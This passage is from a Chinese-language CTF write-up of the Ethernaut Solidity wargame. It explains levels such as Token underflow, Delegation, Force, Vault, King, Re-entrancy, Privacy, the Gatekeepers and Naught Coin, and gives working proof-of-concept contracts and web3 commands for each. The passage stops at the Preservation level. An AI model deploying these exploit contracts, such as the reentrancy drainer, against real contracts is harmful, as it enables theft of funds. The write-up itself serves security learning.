<li>在D -&gt; C -&gt; B -&gt; A 的简单调用链上，D为tx.origin，而B为msg.sender</li>
</ul>
</li>
<li>可能导致钓鱼攻击</li>
</ul>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>通关条件：</p>
<ul>
<li>获取超乎想象的token</li>
</ul>
<p>uint类型，没有使用SafeMath，存在溢出漏洞。</p>
<p>初始状态有20个token，向外发送21个token，即可触发向下溢出漏洞。</p>
<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.transfer(_address,21)</span><br><span class="line">//随便填一个地址，只要不是自己的就行</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(await contract.balanceOf(player)).toNumber() </span><br><span class="line">//查看player的token余额</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>溢出漏洞<ul>
<li>加法溢出</li>
<li>减法溢出</li>
<li>乘法溢出</li>
<li>使用SafeMath避免溢出漏洞</li>
</ul>
</li>
</ul>
<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>通关条件：</p>
<ul>
<li>​    获取合约所有权</li>
</ul>
<p>​    起初以为只要把 pwn() 作为data传给Delegation就可以让它的fallback函数调用Delegate的pwn函数，事实证明，我还是too young,too simple!</p>
<p>然鹅，大佬是这样操作的：web3.sha3(“pwn()”).slice(0,10)。</p>
<p>思考了都没有结果，Google也没找到原因。</p>
<p>直到看到官方文档中的：</p>
<blockquote>
<p> solidity官方文档</p>
<p> 一个函数调用数据的前 4 字节，指定了要调用的函数。这就是某个函数签名的 Keccak（SHA-3）哈希的前 4 字节（高位在左的大端序）（译注：这里的“高位在左的大端序“，指最高位字节存储在最低位地址上的一种串行化编码方式，即高位字节在左） </p>
</blockquote>
<p>​    这才明白了web3.sha3(“pwn()”).slice(0,10)这一连串操作是在干什么。（果然还是我太菜了！）</p>
<p>​    经过sha3加密的pwn()变成了一串16进制数，它的前4个字节就能代表pwn()这个函数，又由于前两个字符是0x,且16进制一位就是4位，所以4个字节等于32位，我们需要的字符数就是8+2=10，所以使用slice(0,10)来截取前10个字符，去掉0x,就是我们需要的函数签名的sha-3的前四字节。</p>
<p>​    将这个字节通过data传给合约，即可实现调用pwn()，完成！</p>
<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//sha3的返回值前两个为0x，所以要切0-10个字符。</span><br><span class="line">contract.sendTransaction(&#123;data: web3.sha3(&quot;pwn()&quot;).slice(0,10)&#125;);</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>1个字节=8位=16进制中的2个字符</li>
<li>ABI说明文档中规定，一个函数调用数据的前4字节，指定了要调用的函数。</li>
</ul>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>通关目标：</p>
<ul>
<li>​    使合约余额大于0</li>
</ul>
<p>​    通过观察可以发现，题目合约中代码真可爱！（其实就是啥都没有！）</p>
<p>​    这个时候就要复习一下向合约发送ether的方法了</p>
<ul>
<li><p>调用payable标识的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract supportPay&#123;</span><br><span class="line">  function deposit() payable&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//直接调用deposit()</span><br><span class="line">//通过address.call(某个方法).value(要发送的ether)来实现的</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>使用send直接向某地址转账: address.send(ether to send)</p>
</li>
<li><p>利用selfdestruct将自身所有ether发送给目标地址： selfdestruct(address);  </p>
<p>因为目标合约没有任何能够接收ether的函数，所以我们只能强制将ether传入合约。</p>
</li>
</ul>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Force &#123;</span><br><span class="line">    function Force() payable public &#123;        </span><br><span class="line">    &#125;</span><br><span class="line">    function ForceSendEther(address _addr) payable public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上不止这一种方法，还有：</p>
<ul>
<li>创建前预先发送ether</li>
<li>为其挖矿</li>
</ul>
<p>关键：</p>
<p>​    强制发送ether的集中方式：</p>
<ul>
<li>通过自毁</li>
<li>创建前预先发送ether</li>
<li>挖矿</li>
</ul>
<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>通关条件：</p>
<ul>
<li>解锁保险库</li>
</ul>
<p>​    查看源码可以发现调用 unlock函数并且输入正确的密码即可解锁。</p>
<p>​    由于合约中的所有内容对用户来说都是可见的，所以密码也应该是我们能访问到的。</p>
<p>​    下面是大佬们的POC。</p>
<p>​    Poc1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, 1, function(x, y)&#123;alert(web3.toAscii(y))&#125;);</span><br></pre></td></tr></table></figure>

<p>​    Poc2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getStorageAt (address, idx) &#123;</span><br><span class="line">  return new Promise (function (resolve, reject) &#123;</span><br><span class="line">    web3.eth.getStorageAt(address, idx, function (error, result) &#123;</span><br><span class="line">      if (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)&#125;</span><br><span class="line"></span><br><span class="line">await getStorageAt(instance, 1);</span><br></pre></td></tr></table></figure>

<p>​    然后我们就可以得到密码： ”A very strong secret password :)“ </p>
<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.unlock(&quot;A very strong secret password :)&quot;)</span><br></pre></td></tr></table></figure>

<p>​    通关后可以看到一些有用的信息</p>
<blockquote>
<p>重要的是要记住，将变量标记为私有只会阻止其他合同访问它。标记为私有变量和局部变量的状态变量仍可公开访问。</p>
<p>为了确保数据是私有的，在将数据放入区块链之前需要对其进行加密。在这种情况下，解密密钥绝不应该在链上发送，因为寻找密钥的任何人都可以看到它。<a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/" target="_blank" rel="noopener">zk-SNARK</a>提供了一种确定某人是否拥有秘密参数的方法，而不必揭露该参数。</p>
</blockquote>
<p>关键：</p>
<ul>
<li>将变量标记为私有只会阻止其他合同访问它。标记为私有变量和局部变量的状态变量仍可公开访问。</li>
</ul>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><p>通关条件：</p>
<ul>
<li>发送比当前奖金还大的ether成为King</li>
<li>提交实例后，保证King的身份不被收回</li>
</ul>
<p>​    第一个条件：成为king</p>
<p>​    我们可以通过向合约发送1.1 ether 来获取King的位置</p>
<p>​    第二个条件：保证位置不被收回</p>
<p>​    收回King的时候，只要抛出异常，不让合约成功调用fallback函数就可以实现</p>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract KingPoc &#123;</span><br><span class="line">    </span><br><span class="line">    function KingPoc() payable &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    address instance_address = 0x63c97a345c05de5f415d0fc5bdfa75bded2c5cfe;</span><br><span class="line">    </span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        instance_address.call.value(1.1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果你以为到这就完了，那你肯定和我一样，吃惊的发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*!@#(*&amp;(@!(#*&amp;(*$&amp;!@#(*&amp;(%@)#$(!@)#(*!@)(#@!(*^#(&amp;()%*)#@(*!@)#(*&amp;    </span><br><span class="line">(╯°□°)--︻╦╤─ - - -  Oops! Looks like you haven&apos;t cracked this level just yet (╯°□°)--︻╦╤─ - - -     </span><br><span class="line">*&amp;@#$(*!@_#)(+!@)_*$(@!$_)&amp;*&amp;%!@#$_)@(#_)@_)#(@(#)&amp;(*$^#*&amp;%^#$)(#@</span><br></pre></td></tr></table></figure>

<p>​    经过一番折腾（大佬的WP），最终发现gas不够！！加加加！闭着眼睛按0，测试网络不缺ether！</p>
<p>​    更多Out of gas的相关信息，看大佬的文章：<a href="https://www.jianshu.com/p/56aa08444b33" target="_blank" rel="noopener">[solidity合约审计 - Out of gas的处理办法]</a></p>
<p>关键：</p>
<ul>
<li>out of gas问题</li>
<li>revert()的使用</li>
</ul>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>通关条件：</p>
<ul>
<li>获取合约中所有资金</li>
</ul>
<p>​    这关的漏洞有个很大的事件——THE DAO黑客事件，可以在搜索引擎上了解了解，这次事件导致了以太坊的分叉——一次充满争议的决策。</p>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable;</span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance);</span><br><span class="line">  function withdraw(uint _amount) public;</span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReentrancePoc &#123;</span><br><span class="line"></span><br><span class="line">    Reentrance reInstance;</span><br><span class="line">    </span><br><span class="line">    function getEther() public &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function ReentrancePoc(address _addr) public&#123;</span><br><span class="line">        reInstance = Reentrance(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function callDonate() public payable&#123;</span><br><span class="line">        reInstance.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        reInstance.withdraw(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;</span><br><span class="line">      if(address(reInstance).balance &gt;= 1 ether)&#123;</span><br><span class="line">        reInstance.withdraw(1 ether);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在这一关中，存在问题的主要重入攻击，通过构造一个恶意合约，在恶意合约的fallback函数中在次调用withdraw函数，反复执行取钱操作，知道题目合约余额为0。</p>
<p>​    在上面的Poc中，我们先使用callDonate存入一笔资金以满足调用withdraw的条件，这里需要注意的是在Remix中调用callDonate之前需要修改value为1 ether。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img7.png" alt="img7"></p>
<p>​    就是这里卡了我很久，因为对Remix使用的不熟悉，起初以为只有在部署合约的时候才会修改value的值，没有想过在函数调用的时候也需要用到。</p>
<p>​    除了这个问题，还有一个很大的问题，就是 OOG问题 ，即Out of gas。 在本地测试不会遇到。这是因为默认的Gas设置不能满足重入的需求，可以手动修改gas的量。 </p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img8.png" alt="img8"></p>
<p>大佬还注意到了一个额外的问题：</p>
<blockquote>
<p> 顺便一提，本体其实还有整数下溢的问题。 </p>
</blockquote>
<p> <code>await getBalance(contract.address)</code>查看合约总余额。为0，则代表通关。 </p>
<p>关键：</p>
<ul>
<li>out of gas 问题</li>
<li>Remix的使用</li>
<li>THE DAO事件</li>
<li>重入漏洞</li>
</ul>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>通关条件：</p>
<ul>
<li>到达电梯顶部</li>
</ul>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BuildingPoc &#123;</span><br><span class="line"></span><br><span class="line">    Elevator ele;</span><br><span class="line">    bool t = true;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint) view public returns (bool)&#123;</span><br><span class="line">        t = !t;</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack(address _addr) public&#123;</span><br><span class="line">        ele = Elevator(_addr);</span><br><span class="line">        ele.goTo(5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    简单分析一下：</p>
<p>​    题目中给出了一个接口Building，其中有一个isLastFloor函数，而合约Elevator中我们能调用的只有goTo函数。bool类型的top变量代表了是否到达顶层，要通过我们就需要将top赋予true，而在goTo函数中，top = building.isLastFloor(floor)，我们只要能将isLastFloor的返回值变为true即可通关。isLastFloor总共有两次返回值，只要第一次返回false，第二次返回true即可。</p>
<p>​    通过以后，题目给出了另一个解决办法：构建一个视图函数。例如 gasleft()</p>
<p>​    暂时还没想到该怎么利用，待更新··· ···</p>
<p>关键：</p>
<ul>
<li>函数即使被修饰了pure、view等修饰符，虽然会有警告，但还是可以修改状态变量的。 </li>
</ul>
<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>通关条件：</p>
<ul>
<li>解锁合约</li>
</ul>
<p>第一种方式是大佬的：</p>
<p>​    直接使用web3 api的 web3.eth.getStorageAt</p>
<p>Poc：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">0</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x000000000000000000000000000000000000000000000000000000d80cff0a01</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">1</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x47dac1a874d4d1f852075da0347307d6fcfef2a6ca6804ffda7b54e02df5c359</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">2</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x06080b7822355f604ab68183a2f2a88e2b5be84a34e590605503cf17aec66668</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">3</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0xd42c0162aa0829887dbd2741259c97ca54fb1a26da7098de6a3697d6c4663b93</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">4</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>

<p>大佬的分析：</p>
<blockquote>
<p>根据 solidity 文档中的变量存储原则，evm 每一次处理 32 个字节，而不足 32 字节的变量相互共享并补齐 32 字节。<br>那么我们简单分析下题目中的变量们：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">bool public locked = <span class="literal">true</span>;  <span class="comment">//1 字节 01</span></span><br><span class="line">uint256 public constant ID = block.timestamp; <span class="comment">//32 字节</span></span><br><span class="line">uint8 private flattening = <span class="number">10</span>; <span class="comment">//1 字节 0a</span></span><br><span class="line">uint8 private denomination = <span class="number">255</span>;<span class="comment">//1 字节 ff</span></span><br><span class="line">uint16 private awkwardness = uint16(now);<span class="comment">//2 字节</span></span><br><span class="line"></span><br><span class="line">bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么第一个 32 字节就是由<code>locked</code>、<code>flattening</code>、<code>denomination</code>、<code>awkwardness</code>组成，另外由于常量是无需存储的，所以从第二个 32 字节起就是 data。<br>那么 data[2] 就是<code>0xd42c0162aa0829887dbd2741259c97ca54fb1a26da7098de6a3697d6c4663b93</code>，<br>注意这里进行了强制类型转换将 data[2] 转换成了 bytes16，那么我们取前 16 字节即可。<br>执行 unlock 即可。</p>
</blockquote>
<p>执行：contract.unlock(‘0xd42c0162aa0829887dbd2741259c97ca’)</p>
<p>over!</p>
<p><a href="https://www.anquanke.com/post/id/148341#h2-12" target="_blank" rel="noopener">Zeppelin Ethernaut writeup</a></p>
<p>上面那篇文章使用的是contract.unlock(web3.toAscii(‘0xd42c0162aa0829887dbd2741259c97ca’))，不知道为什么会出现 ”ALERT: 交易出错. 合约代码执行异常. “错误，看啥时候能解决这个问题吧。</p>
<p>关键：</p>
<ul>
<li>使用web3.getStorageAt读取指定地址数据</li>
<li>evm每次处理32字节</li>
<li>根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。 </li>
<li>常量无需存储 </li>
<li>使用了slice切割字符</li>
</ul>
<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><p>通关条件：</p>
<ul>
<li>满足gateOne、gateTwo、gateThree的所有条件42</li>
</ul>
<p>​    gateOne只要满足msg.sender != tx.origin即可，相信通过前面的关卡这时小菜一碟，只需要创建一个新合约，在合约内部再去调用题目合约即可。</p>
<p>​    gateTwo折磨了我很久很久，总是过不了，看了大佬的POC和分析还是过不了，最后才发现是自己的理解能力不够（太菜了）。gateTwo只要满足进行mod运算时的gas是8191的整数倍即可。</p>
<p>​    在Remix中可以利用debug功能来确定gas应该传入多少，如下图所示，现在本地测试网络进行测试：</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img1.png" alt="img1"></p>
<p>​    然后调用attack进行debug：</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img2.png" alt="img2"></p>
<p>​    在很多大佬的writeUp中所讲的走到DUP2这里， remaining gas应该是8191的整数倍。我开始也是这样的做的，但是这样计算出来的gas就和大佬们的不一样，在本地测试网络中能够跑通，在题目环境中就没办法跑通，这个困扰了我很长一段时间。后来才知道能够在Etherscan上查看每一步的gas消耗，如下图所示：</p>
<p>查看地址： <a href="https://ropsten.etherscan.io/vmtrace?txhash=0xff4a3aed71c20cfe9109403040d1e7f4cd9d77d62dc8cd3205066c3ca5e565c0" target="_blank" rel="noopener">https://ropsten.etherscan.io/vmtrace?txhash=0xff4a3aed71c20cfe9109403040d1e7f4cd9d77d62dc8cd3205066c3ca5e565c0</a> （将txhash后的交易hash改为自己的即可）</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img3.png" alt="img3"></p>
<p>​    在查看了gas消耗情况之后发现，本地显示的gas和这里显示的有所区别，本地能够跑通的在这里会无法满足，在走到DUP2这一步时不是8191的整数倍。而满足了这里的整数倍的数据，在本地发现跑不通了，这个问题暂时不知道是什么情况，目前了解还是太少了，等日后有能力再来解决吧。</p>
<p>​    接下来是gateThree，gateThree有三个条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uint32(_gateKey) == uint16(_gateKey)</span><br><span class="line">uint32(_gateKey) != uint64(_gateKey)</span><br><span class="line">uint32(_gateKey) == uint16(tx.origin)</span><br></pre></td></tr></table></figure>

<p>​    无符号整型可以转换成跟它大小相等或更大的字节类型，但反之不能 。</p>
<p>​    要满足第三个条件只需要_gatekey的前4字节全为0，后4字节为tx.origin的最后4字节，拿我的地址 0x2eb4081c419d1890eb0Af97ce5A9689Cad2fe3da 为例，构造一个0x0000e3da即可，这样可以发现同时满足了第一个条件。</p>
<p>​    还剩第二个条件，uint32(_gatekey)在与uint64进行比较时会由0x0000e3da转换为0x000000000000e3da,要使二者不相等只要gatekey的前半部分不为全0即可，我构造的是：0xFFFFFFFF0000733c（最后四个字节必须改为自己地址的最后4位)。</p>
<p>​    于是最终的Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(msg.gas % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOnePoc &#123;</span><br><span class="line">    </span><br><span class="line">    GatekeeperOne one;</span><br><span class="line">    </span><br><span class="line">    function GatekeeperOnePoc(address _addr) public&#123;</span><br><span class="line">        one = GatekeeperOne(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        one.call.gas(819315)(bytes4(keccak256(&quot;enter(bytes8)&quot;)), bytes8(0xFFFFFFFF0000733c));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们可以通过await contract.entrant()来查看是否完成了通关条件，如果完成，返回值应该是你自己的地址。</p>
<p>关键：</p>
<ul>
<li>debug的使用</li>
<li>etherscan gas消耗详情的查看</li>
<li>uint比较的方式</li>
<li>call对gas的控制以及函数的调用</li>
</ul>
<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>通关条件：</p>
<ul>
<li>与上关差不多，也是满足 modeifier的几个条件即可</li>
</ul>
<p>​    gateOne没啥可说的，依旧是合约调用合约即可。</p>
<p>​    gateTwo直接引用大佬的分析吧。</p>
<blockquote>
<p>gateTwo 中 extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编，来获取调用方(caller)的代码大小，一般来说，caller 为合约时，获取的大小为合约字节码大小，caller 为账户时，获取的大小为 0 。</p>
<p>条件为调用方代码大小为 0 ，但这又与 gateOne 冲突了。经过研究发现，当合约在初始化，还未完全创建时，代码大小是可以为0的。因此，我们需要把攻击合约的调用操作写在 <code>constructor</code> 构造函数中。</p>
</blockquote>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoPoc &#123;</span><br><span class="line">    </span><br><span class="line">     uint64 public mask = 0xFFFFFFFFFFFFFFFF;</span><br><span class="line">    </span><br><span class="line">    function GatekeeperTwoPoc(address _addr)&#123;</span><br><span class="line">        GatekeeperTwo target = GatekeeperTwo(_addr);</span><br><span class="line">        uint64 res =  uint64(keccak256(this)) ^ mask;</span><br><span class="line">        target.enter(bytes8(res));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>extcidesize获取指定地址合约代码大小<ul>
<li>地址为合约时，获取大小为合约字节码大小</li>
<li>地址为账户时，获取的大小为0</li>
</ul>
</li>
<li>当合约在初始化，还未完全创建时，代码大小是可以为0的 </li>
<li>异或两次后得到的数据是原数据</li>
</ul>
<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><p>通关条件：</p>
<ul>
<li>使token变为0</li>
</ul>
<p>​    首先我们需要知道什么是<a href="https://eips.ethereum.org/EIPS/eip-20" target="_blank" rel="noopener">ERC20</a>,然后，直接看大佬的分析吧！</p>
<blockquote>
<p>既然子合约没有什么问题，那我们看看 import 的父合约<br><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Faragon%2Fzeppelin-solidity%2Fblob%2Fmaster%2Fcontracts%2Ftoken%2FStandardToken.sol" target="_blank" rel="noopener">StandardToken.sol</a>，其其实根据 ERC20 的标准我们也知道，转账有两个函数，一个<code>transfer</code>一个<code>transferFrom</code>，题目中代码只重写了<code>transfer</code>函数，那未重写<code>transferFrom</code>就是一个可利用的点了。直接看看<code>StandardToken.sol</code>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract StandardToken &#123;</span><br><span class="line"> using ERC20Lib for ERC20Lib.TokenStorage;</span><br><span class="line"> ERC20Lib.TokenStorage token;</span><br><span class="line"> ...</span><br><span class="line"> function transfer(address to, uint value) returns (bool ok) &#123;</span><br><span class="line">      return token.transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> function transferFrom(address from, address to, uint value) returns (bool ok) &#123;</span><br><span class="line">      return token.transferFrom(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跟进<code>ERC20Lib.sol</code>： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">library ERC20Lib &#123;</span><br><span class="line"> ...</span><br><span class="line"> function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) &#123;</span><br><span class="line">     self.balances[msg.sender] = self.balances[msg.sender].minus(_value);</span><br><span class="line">     self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">     Transfer(msg.sender, _to, _value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) &#123;</span><br><span class="line">     var _allowance = self.allowed[_from](msg.sender);</span><br><span class="line"></span><br><span class="line">     self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">     self.balances[_from] = self.balances[_from].minus(_value);</span><br><span class="line">     self.allowed[_from](msg.sender) = _allowance.minus(_value);</span><br><span class="line">     Transfer(_from, _to, _value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line"> ...</span><br><span class="line"> function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) &#123;</span><br><span class="line">     self.allowed[msg.sender](_spender) = _value;</span><br><span class="line">     Approval(msg.sender, _spender, _value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以直接调用这个<code>transferFrom</code>即可了。但是<code>transferFrom</code>有一步权限验证，要验证这个<code>msg.sender</code>是否被<code>_from</code>（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用 approve 给自己授权。</p>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.approve(player,toWei(1000000))</span><br><span class="line">await contract.transferFrom(player,contract.address,toWei(1000000))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>关键：</p>
<ul>
<li>ERC20的转账操作函数</li>
</ul>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>通关条件：</p>
<ul>
<li>获得合约所有权</li>
</ul>
<blockquote>
<p>delegatecall：进行函数调用时代码是在调用函数的环境里执行</p>
<p>call：call调用其他合约的函数时，代码是在被调用的合约的环境里执行的</p>
</blockquote>
<p>for example：</p>
